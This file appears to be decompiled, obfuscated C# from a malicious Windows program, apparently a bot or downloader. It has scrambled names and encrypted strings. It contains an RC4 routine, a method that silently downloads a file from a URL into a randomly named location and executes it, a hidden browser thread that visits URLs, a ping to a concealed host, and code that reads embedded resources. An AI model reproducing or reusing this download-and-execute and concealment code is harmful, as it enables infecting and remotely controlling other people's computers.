using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ns0;

internal class Class12
{
	private const uint uint_0 = 4u;

	public static Random H6A = new Random();

	private static MD5 md5_0 = new MD5CryptoServiceProvider();

	public static string smethod_0(string string_0)
	{
		byte[] array = md5_0.ComputeHash(Encoding.Default.GetBytes(string_0));
		return BitConverter.ToString(array).Replace(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_1(), _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_2()).ToUpper();
	}

	private static string smethod_1(string string_0)
	{
		FileStream fileStream = File.OpenRead(string_0);
		byte[] array = md5_0.ComputeHash(fileStream);
		fileStream.Close();
		return BitConverter.ToString(array).Replace(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_1(), _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_2()).ToUpper();
	}

	public static bool smethod_2(string string_0)
	{
		if (!File.Exists(string_0))
		{
			return false;
		}
		if (smethod_1(string_0) != smethod_1(Class2.string_4))
		{
			File.Delete(string_0);
			return false;
		}
		return true;
	}

	public static void smethod_3(ref string string_0)
	{
		int num = 0;
		char[] array = string_0.ToCharArray();
		foreach (char c in array)
		{
			num += c;
		}
		string_0 = Convert.ToBase64String(new SHA512Managed().ComputeHash(BitConverter.GetBytes(num)));
	}

	public static void smethod_4(ref string string_0, string string_1)
	{
		byte[] bytes = Encoding.Default.GetBytes(string_0);
		byte[] bytes2 = Encoding.Default.GetBytes(string_1);
		byte[] array = new byte[256];
		int num = 0;
		int num2 = 0;
		for (num = 0; num < 256; num++)
		{
			array[num] = (byte)num;
		}
		for (num = 0; num < 256; num++)
		{
			num2 = (num2 + array[num] + bytes2[num % bytes2.GetLength(0)]) % 256;
			byte b = array[num];
			array[num] = array[num2];
			array[num2] = b;
		}
		num2 = 0;
		num = 0;
		for (int i = 0; i < bytes.GetLength(0); i++)
		{
			num = (num + 1) % 256;
			num2 = (num2 + array[num]) % 256;
			byte b = array[num];
			array[num] = array[num2];
			array[num2] = b;
			bytes[i] ^= array[(array[num] + array[num2]) % 256];
		}
		string_0 = Encoding.Default.GetString(bytes);
	}

	public static string smethod_5(int int_0)
	{
		string text = _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_3();
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < int_0; i++)
		{
			stringBuilder.Append(text.Substring(H6A.Next(0, text.Length), 1));
		}
		return stringBuilder.ToString();
	}

	public static void smethod_6(string string_0)
	{
		if (!string_0.StartsWith(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_4()))
		{
			string_0 = _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_4() + string_0;
		}
		Thread thread = new Thread((ThreadStart)delegate
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_0006: Expected O, but got Unknown
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0018: Expected O, but got Unknown
			//IL_001f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0029: Expected O, but got Unknown
			WebBrowser val = new WebBrowser();
			val.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(smethod_7));
			val.Navigate(new Uri(string_0));
			Application.Run();
		});
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
	}

	private static void smethod_7(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		if (((WebBrowser)((sender is WebBrowser) ? sender : null)).get_Url() == e.get_Url())
		{
			Application.ExitThread();
			smethod_11();
		}
	}

	public static bool smethod_8(string string_0)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		try
		{
			if (!string_0.StartsWith(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_4()))
			{
				string_0 = _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_4() + string_0;
			}
			WebClient val = new WebClient();
			val.set_Proxy((IWebProxy)null);
			WebClient val2 = val;
			Process val3 = new Process();
			string text = string_0.Substring(string_0.LastIndexOf('.')).ToLower();
			string text2 = Environment.GetEnvironmentVariable(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_5()) + _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_6() + smethod_5(H6A.Next(5, 12)) + text;
			val2.DownloadFile(string_0, text2);
			if (!File.Exists(text2) || smethod_1(text2) == smethod_1(Class2.string_4))
			{
				return false;
			}
			val3.get_StartInfo().set_FileName(text2);
			val3.get_StartInfo().set_UseShellExecute(false);
			val3.get_StartInfo().set_ErrorDialog(false);
			val3.Start();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static long smethod_9()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		Ping val = new Ping();
		PingOptions val2 = new PingOptions();
		val2.set_DontFragment(true);
		PingOptions val3 = val2;
		PingReply val4 = val.Send(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_7(), 1000, new byte[32], val3);
		if ((int)val4.get_Status() == 0)
		{
			return val4.get_RoundtripTime();
		}
		return -1L;
	}

	public static string smethod_10(IntPtr intptr_0)
	{
		byte[] array = new byte[0];
		try
		{
			IntPtr intptr_ = FindResource(IntPtr.Zero, intptr_0, (IntPtr)4L);
			IntPtr intptr_2 = LoadResource(IntPtr.Zero, intptr_);
			IntPtr source = LockResource(intptr_2);
			uint num = SizeofResource(IntPtr.Zero, intptr_);
			array = new byte[num];
			Marshal.Copy(source, array, 0, (int)num);
		}
		catch
		{
			return string.Empty;
		}
		return Encoding.Default.GetString(array);
	}

	public static void smethod_11()
	{
		GC.Collect();
		GC.WaitForPendingFinalizers();
		if (Environment.OSVersion.Platform == PlatformID.Win32NT)
		{
			SetProcessWorkingSetSize(Process.GetCurrentProcess().get_Handle(), -1, -1);
		}
	}

	[DllImport("kernel32")]
	private static extern int SetProcessWorkingSetSize(IntPtr intptr_0, int int_0, int int_1);

	[DllImport("kernel32")]
	private static extern IntPtr FindResource(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("kernel32")]
	private static extern IntPtr LoadResource(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("kernel32")]
	private static extern IntPtr LockResource(IntPtr intptr_0);

	[DllImport("kernel32")]
	private static extern uint SizeofResource(IntPtr intptr_0, IntPtr intptr_1);
}
